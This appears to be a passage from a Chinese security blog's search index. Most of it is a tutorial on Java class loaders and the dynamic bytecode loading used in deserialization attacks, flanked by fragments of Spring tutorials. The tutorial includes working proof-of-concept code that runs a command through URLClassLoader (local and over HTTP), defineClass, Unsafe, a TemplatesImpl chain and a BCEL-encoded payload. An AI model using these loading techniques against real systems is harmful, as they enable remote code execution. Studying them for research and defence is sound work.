user:add，user:update，不然会 500 报错。\n0x05 参考资料SpringBoot整合框架 – JohnFrod’s Blog【狂神说Java】SpringBoot最新教程IDEA版通俗易懂\n","categories":["Java 开发"],"tags":["Java 开发"]},{"title":"Java反序列化基础篇-05-类的动态加载","url":"/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/","content":"类的动态加载\n\nJava反序列化基础篇-05-类的动态加载0x01 前言这篇文章&#x2F;笔记的话，打算从类加载器，双亲委派到代码块的加载顺序这样来讲。最后才是加载字节码。\n0x02 类加载器及双亲委派\n说类加载器有些师傅可能没听过，但是说 Java ClassLoader，相信大家耳熟能详。\n\n1. 类加载器有什么用\n加载 Class 文件\n\n以这段简单代码为例\nStudent student = new Student();\n\n我们知道，Student 本身其实是一个抽象类，是通过 new 这个操作，将其实例化的，类加载器做的便是这个工作。\nClassLoader 的工作如图所示\n\n\n加载器也分多种加载器，每个加载器负责不同的功能。\n主要分为这四种加载器\n\n\n虚拟机自带的加载器\n启动类（根）加载器\n扩展类加载器\n应用程序加载器\n\n\n2. 几种加载器引导类加载器\n引导类加载器(BootstrapClassLoader)，底层原生代码是 C++ 语言编写，属于 JVM 一部分。\n\n不继承 java.lang.ClassLoader 类，也没有父加载器，主要负责加载核心 java 库(即 JVM 本身)，存储在 /jre/lib/rt.jar 目录当中。(同时处于安全考虑，BootstrapClassLoader 只加载包名为 java、javax、sun 等开头的类)。\n扩展类加载器（ExtensionsClassLoader）扩展类加载器(ExtensionsClassLoader)，由 sun.misc.Launcher$ExtClassLoader 类实现，用来在 /jre/lib/ext 或者 java.ext.dirs 中指明的目录加载 java 的扩展库。Java 虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载 java 类。\nApp类加载器（AppClassLoader）App类加载器&#x2F;系统类加载器（AppClassLoader），由 sun.misc.Launcher$AppClassLoader 实现，一般通过通过( java.class.path 或者 Classpath 环境变量)来加载 Java 类，也就是我们常说的 classpath 路径。通常我们是使用这个加载类来加载 Java 应用类，可以使用 ClassLoader.getSystemClassLoader() 来获取它。\n3. 双亲委派机制\n在 Java 开发当中，双亲委派机制是从安全角度出发的。\n\n我们这里以代码先来感受一下，双亲委派机制确实牛逼。\n从报错的角度感受双亲委派机制\n尽量别尝试，看看就好了。要不然整个文件夹挺乱的，如果想上手尝试一下的话，我建议是新建一个项目，不要把其他的文件放一起。\n\n新建一个 java.lang的文件夹，在其中新建 String.java 的文件。\nString.java\npackage java.lang;  \n  \n// 双亲委派的错误代码  \npublic class String &#123;  \n  \n    public String toString()&#123;  \n        return \"hello\";  \n &#125;  \n  \n    public static void main(String[] args) &#123;  \n        String s = new String();  \n s.toString();  \n &#125;  \n&#125;\n\n看着是不是没有问题，没有错误吧？我们自己定义了一个 java.lang 的文件夹，并在文件夹中定义了 String.class，还定义了 String 这个类的 toString 方法。我们跑一下程序。（这里如果把 Stirng 类放到其他文件夹会直接报错，原因也是和下面一样的）\n\n结果居然报错了！而且非常离谱\n\n\n\n我这不是已经定义了 main 方法吗？？为什么还会报错，这里就提到双亲委派机制了，双亲委派机制是从安全角度出发的。\n首先，我们要知道 Java 的类加载器是分很多层的，如图。\n\n\n我们的类加载器在被调用时，也就是在 new class 的时候，它是以这么一个顺序去找的 BOOT —&gt; EXC —-&gt; APP\n如果 BOOT 当中没有，就去 EXC 里面找，如果 EXC 里面没有，就去 APP 里面找。\n\n所以我们之前报错的程序当中，定义的 java.lang.String 在 BOOT 当中是有的，所以我们自定义 String 时，会报错，如果要修改的话，是需要去 rt.jar 里面修改的，这里就不展开了。\n\n从正确的角度感受双亲委派机制前文提到我们新建的 java.lang.String 报错了，是因为我们定义的 String 和 BOOT 包下面的 String 冲突了，所以才会报错，我们这里定义一个 BOOT 和 EXC 都没有的对象试一试。\n在其他的 文件夹下，新建 Student.java\nStudent.java\npackage src.DynamicClassLoader;  \n  \n// 双亲委派的正确代码  \npublic class Student &#123;  \n  \n    public String toString()&#123;  \n        return \"Hello\";  \n &#125;  \n  \n    public static void main(String[] args) &#123;  \n        Student student = new Student();  \n  \n System.out.println(student.getClass().getClassLoader());  \n System.out.println(student.toString());  \n &#125;  \n&#125;\n\n并把加载器打印出来\n\n我们定义的 Student 类在 APP 加载器中找到了。\n0x03 各场景下代码块加载顺序\n这里的代码块主要指的是这四种\n\n静态代码块：static&#123;&#125;\n构造代码块：&#123;&#125;\n无参构造器：ClassName()\n有参构造器：ClassName(String name)\n\n\n\n场景一、实例化对象这里有两个文件，分别介绍一下用途：\n\nPerson.java：一个普普通通的类，里面有静态代码块、构造代码块、无参构造器、有参构造器、静态成员变量、普通成员变量、静态方法。\nMain.java：启动类\n\nPerson.java\npackage src.DynamicClassLoader;  \n  \n// 存放代码块  \npublic class Person &#123;  \n    public static int staticVar;  \n public int instanceVar;  \n  \n static &#123;  \n        System.out.println(\"静态代码块\");  \n &#125;  \n  \n    &#123;  \n        System.out.println(\"构造代码块\");  \n &#125;  \n  \n    Person()&#123;  \n        System.out.println(\"无参构造器\");  \n &#125;  \n    Person(int instanceVar)&#123;  \n        System.out.println(\"有参构造器\");  \n &#125;  \n  \n    public static void staticAction()&#123;  \n        System.out.println(\"静态方法\");  \n &#125;  \n&#125;\n\nMain.java\npackage src.DynamicClassLoader;  \n  \n// 代码块的启动器  \npublic class Main &#123;  \n    public static void main(String[] args) &#123;  \n        Person person = new Person();  \n &#125;  \n&#125;\n\n运行结果如图\n\n\n\n结论：\n\n通过 new 关键字实例化的对象，先调用静态代码块，然后调用构造代码块，最后根据实例化方式不同，调用不同的构造器。\n场景二、调用静态方法直接调用类的静态方法\nPerson.java 不变，修改 Main.java 启动器即可。\nMain.java\npackage src.DynamicClassLoader;  \n  \n// 代码块的启动器  \npublic class Main &#123;  \n    public static void main(String[] args) &#123;  \n        Person.staticAction();  \n &#125;  \n&#125;\n\n\n\n结论：\n\n不实例化对象直接调用静态方法，会先调用类中的静态代码块，然后调用静态方法\n场景三、对类中的静态成员变量赋值Main.java\npackage src.DynamicClassLoader;  \n  \n// 代码块的启动器  \npublic class Main &#123;  \n    public static void main(String[] args) &#123;  \n \t\tPerson.staticVar = 1;  \n \t&#125;  \n&#125;\n\n\n\n\n结论：\n\n在对静态成员变量赋值前，会调用静态代码块\n场景四、使用 class 获取类package src.DynamicClassLoader;  \n  \n// 代码块的启动器  \npublic class Main &#123;  \n    public static void main(String[] args) &#123;  \n \t\tClass c = Person.class;  \n \t&#125;  \n&#125;\n\n// 空屁\n\n\n结论：\n\n利用 class 关键字获取类，并不会加载类，也就是什么也不会输出。\n场景五、使用 forName 获取类\n这里要抛出异常一下。\n\n我们写三种 forName 的方法调用。修改 Main.java\npackage src.DynamicClassLoader;  \n  \n// 代码块的启动器  \npublic class Main &#123;  \n    public static void main(String[] args) throws ClassNotFoundException&#123;  \n \t\tClass.forName(\"src.DynamicClassLoader.Person\");\n \t&#125;  \n&#125;\n// 静态代码块\n\n\npackage src.DynamicClassLoader;  \n  \n// 代码块的启动器  \npublic class Main &#123;  \n    public static void main(String[] args) throws ClassNotFoundException&#123;   \n \tClass.forName(\"src.DynamicClassLoader.Person\", true, ClassLoader.getSystemClassLoader());  \n &#125;  \n&#125;\n// 静态代码块\n\n\npackage src.DynamicClassLoader;  \n  \n// 代码块的启动器  \npublic class Main &#123;  \n    public static void main(String[] args) throws ClassNotFoundException&#123;   \n \tClass.forName(\"src.DynamicClassLoader.Person\", false, ClassLoader.getSystemClassLoader());\n &#125;  \n&#125;\n//没有输出\n\n结论：\n\nClass.forName(className)和Class.forName(className, true, ClassLoader.getSystemClassLoader())等价，这两个方法都会调用类中的静态代码块，如果将第二个参数设置为false，那么就不会调用静态代码块\n场景六、使用 ClassLoader.loadClass() 获取类Main.java\npackage com.xiinnn.i.test;\n\npublic class Main &#123;\n    public static void main(String[] args) throws ClassNotFoundException &#123;\n        Class.forName(\"com.xiinnn.i.test.Person\", false, ClassLoader.getSystemClassLoader());\n    &#125;\n&#125;\n//没有输出\n\n结论：\n\nClassLoader.loadClass()方法不会进行类的初始化，当然，如果后面再使用newInstance()进行初始化，那么会和场景一、实例化对象一样的顺序加载对应的代码块。\n0x04 动态加载字节码\n在说动态加载字节码之前，先明确一下何为字节码。\n\n1. 字节码的概念什么是字节码？\n\n严格来说，Java 字节码（ByteCode）其实仅仅指的是 Java 虚拟机执行使用的一类指令，通常被存储在 .class 文件中。\n\n我个人很喜欢把它比作 Dockerfile 里面，执行命令的一些代码，例如 entrypoint 这种。\n而字节码的诞生是为了让 JVM 的流通性更强，这是什么意思呢？看图便知。\n\n\n2. 类加载器的原理根据前面各场景下代码块的加载顺序我们得知，在 loadClass() 方法被调用的时候，是不进行类的初始化的。\n代码：\nClassLoader c = ClassLoader.getSystemClassLoader();  \nc.loadClass(\"BasiClassLoader.Person\");\n\n打一下断点，调试一下，断点打在 ClassLoader.loadClass() 的地方，也就是父类。为什么这么打断点是有原因的，因为最开始我们已知 “Person” 类它是 Launcher@APPClassLoader，它里面是有一个 loadClass() 方法的，但是它只有一个参数。所以断点下在 ClassLoader.loadClass() 之类\n开始调试\n调试先会走到 ClassLoader.loadClass()，这里其实 return 就多给了一个参数为 false；我们 ctrl + f7 跟进。又会回到 Launcher@APPClassLoader 这里。\n\n\n中间是一些简单的判断安全的过程，这里就不看了，继续往下走，直到 return (super.loadClass(name, resolve)); 这里，继续跟进。也就是回到了之前的 ClassLoader 类。\n\n\n往下走，先检查类是否加载过，这里其实就是双亲委派的流程了。我们之前说委派机制是从最下面网上找，如果上面有就调用上面的，如果上面没有，就调用本身，也就是 AppClassLoader\n\n\n这里 null 是因为最上面的 Bootstrap 类是 native 类，也就是之前说过的 C 写的源码，所以为 null。\n继续往下走，因为 APP 和 Ext 的父类是 URLClassLoader，所以这里的 findClass() 是会去找到 URLClassLoader 的。\n接着在 URLClassLoader 里面调用了 defineClass 方法，再一步步跟进就是我们的 native 方法了。\n总的流程:ClassLoader —-&gt; SecureClassLoader —&gt; URLClassLoader —-&gt; APPClassLoader —-&gt; loadClass() —-&gt; findClass()\n下面我们介绍多种能够用于反序列化攻击的，加载字节码的类加载器。\n\n\nJava 动态字节码的一些用法\n\n3. 利用 URLClassLoader 加载远程 class 文件URLClassLoader 实际上是我们平时默认使用的 AppClassLoader 的父类，所以，我们解释 URLClassLoader 的工作过程实际上就是在解释默认的 Java 类加载器的工作流程。\n正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：\n①：URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件\n②：URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件\n③：URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类。\n我们一个个看\nfile 协议我们在目录下新建一个 Calc.java 的文件。\npackage src;  \n  \nimport java.io.IOException;  \n  \n// URLClassLoader 的 file 协议  \npublic class Calc &#123;  \n    static &#123;  \n        try &#123;  \n            Runtime.getRuntime().exec(\"calc\");  \n &#125; catch (IOException e)&#123;  \n            e.printStackTrace();  \n &#125;  \n    &#125;  \n&#125;\n\n接着，点小锤子编译一下，我们会在 out 的 src 文件夹下发现编译过的 .class 文件。接着，我们进行一下复制的操作，将其复制到 E 盘。\n\n\n接着，我们编写 URLClassLoader 的启动类\npackage src.DynamicClassLoader.URLClassLoader;  \n  \nimport java.net.URL;  \nimport java.net.URLClassLoader;  \n  \n// URLClassLoader 的 file 协议  \npublic class FileRce &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        URLClassLoader urlClassLoader = new URLClassLoader  \n                (new URL[]&#123;new URL(\"file:///E:\\\\\")&#125;);  \n Class calc = urlClassLoader.loadClass(\"src.DynamicClassLoader.URLClassLoader.Calc\");  \n calc.newInstance();  \n &#125;  \n&#125;\n\n成功弹出了计算器\n\n\nHTTP 协议在 Calc.class 文件目录下执行 python3 -m http.server 9999，起一个 http 服务。我这里是 E 盘根目录，就在 E 盘起。\n接着，我们编写恶意利用类\npackage src.DynamicClassLoader.URLClassLoader;  \n  \nimport java.net.URL;  \nimport java.net.URLClassLoader;  \n  \n// URLClassLoader 的 HTTP 协议  \npublic class HTTPRce &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]&#123;new URL(\"http://127.0.0.1:9999\")&#125;);  \n Class calc = urlClassLoader.loadClass(\"src.DynamicClassLoader.URLClassLoader.Calc\");  \n calc.newInstance();  \n &#125;  \n&#125;\n\n\n\nfile+jar 协议先将我们之前的 class 文件打包一下，打包为 jar 文件。\n去到源 .class 文件下，别去复制的地方，运行命令\njar -cvf Calc.jar Clac.class\n\n接着，我们修改启动器，调用恶意类\npackage src.DynamicClassLoader.URLClassLoader;  \n  \nimport java.net.URL;  \nimport java.net.URLClassLoader;  \n  \n// URLClassLoader 的 file + jarpublic class JarRce &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]&#123;new URL(\"jar:file:///E:\\\\Calc.jar!/\")&#125;);  \n Class calc = urlClassLoader.loadClass(\"src.DynamicClassLoader.URLClassLoader.Calc\");  \n calc.newInstance();  \n  \n &#125;  \n&#125;\n\n\n\nHTTP + jar 协议package src.DynamicClassLoader.URLClassLoader;  \n  \nimport java.net.URL;  \nimport java.net.URLClassLoader;  \n  \n// URLClassLoader 的 HTTP + jarpublic class HTTPJarRce &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]&#123;new URL(\"jar:http://127.0.0.1:9999/Calc.jar!/\")&#125;);  \n Class calc = urlClassLoader.loadClass(\"src.DynamicClassLoader.URLClassLoader.Calc\");  \n calc.newInstance();  \n &#125;  \n&#125;\n\n\n成功弹出计算器\n\n最灵活的肯定是 http 协议的加载\n4. 利用 ClassLoader#defineClass 直接加载字节码不管是加载远程 class 文件，还是本地的 class 或 jar 文件，Java 都经历的是下面这三个方法调用。\n\n\n从前面的分析可知：\n\nloadClass() 的作用是从已加载的类、父加载器位置寻找类（即双亲委派机制），在前面没有找到的情况下，调用当前ClassLoader的findClass()方法；\nfindClass() 根据URL指定的方式来加载类的字节码，其中会调用defineClass()；\ndefineClass 的作用是处理前面传入的字节码，将其处理成真正的 Java 类所以可见，真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java\n\n默认的 ClassLoader#defineClass 是一个 native 方法，逻辑在 JVM 的C语言代码中。\n我们跟进 ClassLoader 当中，去看一看 DefineClass 是怎么被调用的。\n\n\n解释一下 defineClass\nname为类名，b为字节码数组，off为偏移量，len为字节码数组的长度。\n因为系统的 ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问。因此可以反射调用 defineClass() 方法进行字节码的加载，然后实例化之后即可弹 shell\n我们编写如下代码\npackage src.DynamicClassLoader.DefineClass;  \n  \nimport java.lang.reflect.Method;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \n  \n// 利用 ClassLoader#defineClass 直接加载字节码  \npublic class DefineClassRce &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        ClassLoader classLoader = ClassLoader.getSystemClassLoader();  \n Method method = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class);  \n method.setAccessible(true);  \n byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\Calc.class\")); // 字节码的数组  \n Class c = (Class) method.invoke(classLoader, \"src.Calc\", code, 0, code.length);  \n c.newInstance();  \n &#125;  \n&#125;\n\n\n成功弹出计算器，如果报错的话，看一看 invoke 方法调用时的 “Calc” 位置是否正确。\n\n使用ClassLoader#defineClass直接加载字节码有个优点就是不需要出网也可以加载字节码，但是它也是有缺点的，就是需要设置m.setAccessible(true);，这在平常的反射中是无法调用的。\n在实际场景中，因为 defineClass 方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链 TemplatesImpl 的基石。\n5. Unsafe 加载字节码\nUnsafe中也存在defineClass()方法，本质上也是 defineClass 加载字节码的方式。\n\n跟进去看一看 Unsafe 的 defineClass() 方法\n\n\n这里的 Unsafe 方法，是采用单例模式进行设计的，所以虽然是  public 方法，但无法直接调用，因为我们用反射来调用它。\npackage src.DynamicClassLoader.UnsafeClassLoader;  \n  \nimport sun.misc.Unsafe;  \n  \nimport java.lang.reflect.Field;  \nimport java.lang.reflect.Method;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.security.ProtectionDomain;  \n  \npublic class UnsafeClassLoaderRce &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        ClassLoader classLoader = ClassLoader.getSystemClassLoader();  \n Class&lt;Unsafe> unsafeClass = Unsafe.class;  \n Field unsafeField = unsafeClass.getDeclaredField(\"theUnsafe\");  \n unsafeField.setAccessible(true);  \n Unsafe classUnsafe = (Unsafe) unsafeField.get(null);  \n Method defineClassMethod = unsafeClass.getMethod(\"defineClass\", String.class, byte[].class,  \n int.class, int.class, ClassLoader.class, ProtectionDomain.class);  \n byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\Calc.class\"));  \n Class calc = (Class) defineClassMethod.invoke(classUnsafe, \"src.Calc\", code, 0, code.length, classLoader, null);  \n calc.newInstance();  \n &#125;  \n&#125;\n\n6. TemplatesImpl 加载字节码\n我们先跟进 TemplatesImpl 这个包中看 TemplatesImpl 的结构图\n\n\n\n可以看到在 TemplatesImpl 类中还有一个内部类 TransletClassLoader，这个类是继承 ClassLoader，并且重写了 defineClass 方法。\n\n\n\n简单来说，这里的 defineClass 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。\n\n我们从 TransletClassLoader#defineClass() 向前追溯一下调用链：\nTemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->\n\nTemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()\n\n-> TransletClassLoader#defineClass()\n\n追到最前面两个方法 TemplatesImpl#getOutputProperties() 和 TemplatesImpl#newTransformer() ，这两者的作用域是public，可以被外部调用。\n我们尝试用 TemplatesImpl#newTransformer() 构造一个简单的 POC\n首先先构造字节码，注意，这里的字节码必须继承AbstractTranslet，因为继承了这一抽象类，所以必须要重写一下里面的方法。\npackage src.DynamicClassLoader.TemplatesImplClassLoader;  \n  \nimport com.sun.org.apache.xalan.internal.xsltc.DOM;  \nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;  \nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  \nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;  \n  \nimport java.io.IOException;  \n  \n// TemplatesImpl 的字节码构造  \npublic class TemplatesBytes extends AbstractTranslet &#123;  \n    public void transform(DOM dom, SerializationHandler[] handlers) throws TransletException&#123;&#125;  \n    public void transform(DOM dom, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException&#123;&#125;  \n    public TemplatesBytes() throws IOException&#123;  \n        super();  \n Runtime.getRuntime().exec(\"Calc\");  \n &#125;  \n&#125;\n\n字节码这里的编写比较容易，我就一笔带过了，接下来我们重点关注 POC 是如何编写出来的。\n因为是一整条链子，参考最开始我们讲的 URLDNS 链，我们需要设置其一些属性值，从而让我们的链子传递下去。我这里先把 POC 挂出来，结合着讲。\npackage src.DynamicClassLoader.TemplatesImplClassLoader;  \n  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \n  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \n  \n// 主程序  \npublic class TemplatesRce &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\JavaClass\\\\TemplatesBytes.class\"));  \n TemplatesImpl templates = new TemplatesImpl();  \n setFieldValue(templates, \"_name\", \"Calc\");  \n setFieldValue(templates, \"_bytecodes\", new byte[][] &#123;code&#125;);  \n setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());  \n templates.newTransformer();  \n &#125;  \n    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;  \n        Field field = obj.getClass().getDeclaredField(fieldName);  \n field.setAccessible(true);  \n field.set(obj, value);  \n &#125;  \n&#125;\n\n我们定义了一个设置私有属性的方法，命名为 setFieldValue，根据我们的链子，一个个看。\n\nTemplatesImpl#getOutputProperties() -&gt;TemplatesImpl#newTransformer() -&gt;TemplatesImpl#getTransletInstance() -&gt;TemplatesImpl#defineTransletClasses() -&gt;TransletClassLoader#defineClass()\n\n\n主要是三个私有类的属性setFieldValue(templates, \"_name\", \"Calc\"); \n\n\n显然，_name 不能为 null，我们才能进入链子的下一部分。链子的下一部分为 defineTransletClasses，我们跟进去。\n\n\n_tfactory 需要是一个 TransformerFactoryImpl 对象，因为 TemplatesImpl#defineTransletClasses() 方法里有调用到 _tfactory.getExternalExtensionsMap() ，如果是 null 会出错。\n弹计算器成功\n\n\n7. 利用 BCEL ClassLoader 加载字节码\n什么是 BCEL？\n\nBCEL 的全名应该是 Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被 Apache Xalan 所使用，而 Apache Xalan 又是 Java 内部对于 JAXP 的实现，所以 BCEL 也被包含在了 JDK 的原生库中。\n我们可以通过 BCEL 提供的两个类 Repository 和 Utility 来利用： Repository 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译 java 文件生成字节码； Utility 用于将原生的字节码转换成BCEL格式的字节码：\n我们还是用之前写过的 Calc.java 这个类。\npackage src.DynamicClassLoader.URLClassLoader;  \n  \nimport java.io.IOException;  \n   \npublic class Calc &#123;  \n    static &#123;  \n        try &#123;  \n            Runtime.getRuntime().exec(\"calc\");  \n &#125; catch (IOException e)&#123;  \n            e.printStackTrace();  \n &#125;  \n    &#125;  \n&#125;\n\n这样子的代码是可以成功弹计算器了，但是我们发现有一堆乱码，处理一下。\n\n\n这一堆特殊的代码，BCEL ClassLoader 正是用于加载这串特殊的“字节码”，并可以执行其中的代码。我们修改一下 POC\n\n注意这里的 ClassLoader 包不要导错了。\n\npackage src.DynamicClassLoader.BCELClassLoader;  \n  \nimport com.sun.org.apache.bcel.internal.util.ClassLoader;  \n  \n// 修改过滤乱码  \npublic class BCELSuccessRce &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        new ClassLoader().loadClass(\"$$BCEL$$\" + \"$l$8b$I$A$A$A$A$A$A$A$8dQMO$db$40$Q$7d$9b8$b1c$i$C$81$f0$d1$PhK$81$QU$f5$a57$Q$97$ARU$D$V$Bz$de$y$ab$b0$d4$b1$p$7b$83$e0$X$f5$cc$85$o$O$fd$B$fc$u$c4$ecBi$a4$f6PK$9e$f1$7b3$f3$e6$ad$f7$ee$fe$f6$X$80OX$f1$e1a$d6$c7$i$e6$3d$bc0$f9$a5$8bW$3eJx$edb$c1$c5$oCyC$rJo2$U$9bk$c7$MN$3b$3d$91$M$b5H$rro$d8$ef$ca$ec$90wcb$eaQ$wx$7c$cc3e$f0$T$e9$e8S$953$7c$88$f2L$84$5b$97$J$ef$x$d1$8ey$9eG$v$3f$91Yxt$Q$8d$c26$8f$c5$3a$83$b7$n$e2$a7$a5$8cD$g$d1$Z$3f$e7$a1J$c3$cf$fb$db$XB$O$b4J$Tj$abv4$X$dfw$f9$c0$$$p$df$M$7e$t$jfB$ee$u$b3$bcb$e4$3e$9a$d9$A$V$f8$$$de$Ex$8bw$e4$8a$8c$8a$AKx$cf0$f5$P$ed$A$cb$f0$ZZ$ffo$9aa$c2$ea$c4$3c$e9$85$fb$dd3$v4$c3$e4$l$ea$60$98h$d5$tO$7eO$eag$d0h$aeE$7f$f5$d0$c1$iy$nIr$b59R$ed$e8L$r$bd$f5$d1$81$afY$wd$9e$d3$40m$40Em$7f$c7a$c6$85$a4c$bat$b1$e6$v$80$99$c3S$i$p$URf$94K$ad$9f$60W$b6$iP$y$5b$b2$8c$w$c5$e0$b1$B$e3$a8Q$f60$f1$3c$cc$ad$YP$bfA$a1$5e$bc$86$f3$ed$H$bc$_$adk$94$af$y_$a1$d9$S$8aVq$86$be$Mc$b8$80$U$aa$a40I$f1$f7$86$w$i$c2uBS$f4$ba$uD$$$a6$j$w4$ac$a9$99$H$X$f0$df$84$a2$C$A$A\").newInstance();  \n &#125;  \n&#125;\n\n那么为什么要在前面加上 $$BCEL$$ 呢？这里引用一下p神的解释\n\nBCEL 这个包中有个有趣的类com.sun.org.apache.bcel.internal.util.ClassLoader，他是一个 ClassLoader，但是他重写了 Java 内置的ClassLoader#loadClass()方法。\n在 ClassLoader#loadClass() 中，其会判断类名是否是 $$BCEL$$ 开头，如果是的话，将会对这个字符串进行 decode\n\n0x05 关于字节码的小结\n首先我们要知道字节码与安全有什么关系，不是照着敲几行代码，看到弹出计算器就是可以的了，我们需要去分析原因，不然和安全研究没有半毛钱关系。\n\n我们要最终达到的目的其实是加载 class 文件，也就是字节码文件。所以我们所做的一系列工作都是为了能够调用这些 class，只有完成了这一步，才能继续我们的链子。\n","categories":["Java"],"tags":["Java"]},{"title":"Java开发之SpringSecurity学习","url":"/2022/07/08/Java%E5%BC%80%E5%8F%91%E4%B9%8BSpringSecurity%E5%AD%A6%E4%B9%A0/","content":"Java开发之SpringSecurity学习\n\nJava 开发之 SpringSecurity 学习0x01 前言大部分开发的内容是跟着 johnford 师傅写的学完这个就该继续跟着链子了，算是给自己放松两天。\n0x02 什么是 SpringSecuritySpring Security 是针对 Spring 项目的安全框架，也是 SpringBoot 底层安全模块默认的技术选型，他可以实现强大的Web安全控制，对于安全控制，我们仅需要引入spring-boot-starter-security 模块，进行少量的配置，即可实现强大的安全管理！\n记住几个类：\n\nWebSecurityConfigurerAdapter：自定义 Security 策略\nAuthenticationManagerBuilder：自定义认证策略\n@EnableWebSecurity：开启 WebSecurity 模式\n\nSpring Security的两个主要目标是 “认证” 和 “授权”（访问控制）。\n“认证”（Authentication）\n身份验证是关于验证您的凭据，如用户名&#x2F;用户ID和密码，以验证您的身份。\n身份验证通常通过用户名和密码完成，有时与身份验证因素结合使用。\n“授权” （Authorization）\n授权发生在系统成功验证您的身份后，最终会授予您访问资源（如信息，文件，数据库，资金，位置，几乎任何内容）的完全权限。\n这个概念是通用的，而不是只在 Spring Security 中存在。\n0x03 环境\n这里的环境配置是比较重要的，因为我自己环境没配好，所以踩了很多坑。\n\n环境如下\n\nMaven 3.6.3\nSpringBoot 2.7.1\njdk8u_312\n\n这里的环境最开始的 pom.xml 不要加入 SpringSecurity 的包。我就是导入了 SpringSecurity 的包之后搞得乱七八糟的。\n这里有点挺坑的，如果直接导入包的话，无论啥界面都会跳到 SpringSecurity 的自动拦截的 /login 接口，但是我们先不导入，后续再导入就不会有这个问题，真的坑。\n0x04 我们要做的工作我们的 SpringSecurity 只需要我们完成 SpringSecurityConfig 即可，需要继承 WebSecurityConfigurerAdapter 这个类，再重写其中的 configure 方法。\n其中两个 configure 方法，一个的传参是 HttpSecurity，负责授权，另一个为 AuthenticationManagerBuilder，负责认证。\n 这一拦截是全局拦截，也就是说，你需要登录才能查看网页的全部内容，嗯感觉毕设用这个比较好混。\n\n在认证这个部分，可以与数据库进行交互，然后是必须进行加密的，这里算是一个坑点。\n\n看 b 站狂神的视频里面，是结合全栈开发的，所以了解甚微，也不太好评论，就看吧。\n0x05 代码实践首先搭个环境，一般搭环境这里我都推荐只选 Spring Web，其他后续的话，要什么就加什么。\n1. 项目搭建与一些静态资源\n\nRouterController 接口管理\npackage springsecurity.controller;\n \nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.RequestMapping;\n \n@Controller\npublic class RouterController &#123;\n \n    @RequestMapping(&#123;\"/\",\"/index\"&#125;)\n    public String index()&#123;\n        return \"index\";\n    &#125;\n \n    @RequestMapping(\"/toLogin\")\n    public String toLogin()&#123;\n        return \"views/login\";\n    &#125;\n \n    @RequestMapping(\"/level1/&#123;id&#125;\")\n    public String level1(@PathVariable(\"id\") int id)&#123;\n        return \"views/level1/\"+id;\n    &#125;\n \n    @RequestMapping(\"/level2/&#123;id&#125;\")\n    public String level2(@PathVariable(\"id\") int id)&#123;\n        return \"views/level2/\"+id;\n    &#125;\n \n    @RequestMapping(\"/level3/&#123;id&#125;\")\n    public String level3(@PathVariable(\"id\") int id)&#123;\n        return \"views/level3/\"+id;\n    &#125;\n \n&#125;\n\n写完接口之后先跑一下，看一下环境是否 ok\n2. 完成 SpringSecurity 的认证与授权先引入 Spring Security 模块\n&lt;dependency>\n   &lt;groupId>org.springframework.boot&lt;/groupId>\n   &lt;artifactId>spring-boot-starter-security&lt;/artifactId>\n&lt;/dependency>\n\n实现基础配置\npackage springsecurity.config;\n \nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\n \n@EnableWebSecurity // 开启WebSecurity模式\npublic class SecurityConfig extends WebSecurityConfigurerAdapter &#123;\n \n   @Override\n   protected void configure(HttpSecurity http) throws Exception &#123;\n \n  